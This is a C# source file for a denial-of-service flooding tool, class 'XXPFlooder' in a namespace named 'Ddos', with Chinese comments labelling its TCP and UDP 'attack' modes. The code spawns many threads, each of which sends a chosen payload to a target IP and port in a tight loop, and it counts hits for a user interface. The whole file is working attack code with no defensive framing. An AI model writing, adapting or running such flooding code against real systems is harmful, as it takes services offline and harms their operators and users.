using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Ddos
{
    class XXPFlooder
    {
        private bool isFlooding = false;

        public DdosEventHandler attackedNum_Changed;
        public DdosEventHandler threadingNum_Changed;

        public string Ip;
        public int Port;
        public int Protocol;
        public int Delay;
        public bool Resp;
        public string Data;
        public int ThreadNum;

        public void Start()
        {
            this.isFlooding = true;
            //创建线程并执行
            for (int i = 0; i < this.ThreadNum; i++)
            {
                Thread thread = new Thread(new ParameterizedThreadStart((obj) =>
                {
                    this.doWork();
                }));
                thread.Start();

            }
        }

        public void Stop()
        {
            this.isFlooding = false;
        }

        private void doWork()
        {
            //添加线程数
            this.threadingNum_Changed.Invoke(1);
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes(this.Data);
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.Ip), this.Port);
                while (this.isFlooding)
                {
                    //tcp协议攻击
                    if (this.Protocol == 1)
                    {
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.Connect(remoteEP);
                        socket.Blocking = this.Resp;

                        while (this.isFlooding)
                        {
                            //更新界面的已攻击次数
                            this.attackedNum_Changed.Invoke();

                            socket.Send(bytes);
                            if (this.Delay > 0)
                            {
                                Thread.Sleep(this.Delay);
                            }
                        }
                    }
                    //udp协议攻击
                    if (this.Protocol == 2)
                    {
                        Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        socket2.Blocking = this.Resp;

                        while (this.isFlooding)
                        {
                            //更新界面的已攻击次数
                            this.attackedNum_Changed.Invoke();

                            socket2.SendTo(bytes, SocketFlags.None, remoteEP);
                            if (this.Delay > 0)
                            {
                                Thread.Sleep(this.Delay);
                            }
                        }
                    }
                }
            }
            catch
            {
                this.isFlooding = false;
            }

            //减少线程数
            this.threadingNum_Changed.Invoke(0);
        }

    }
}
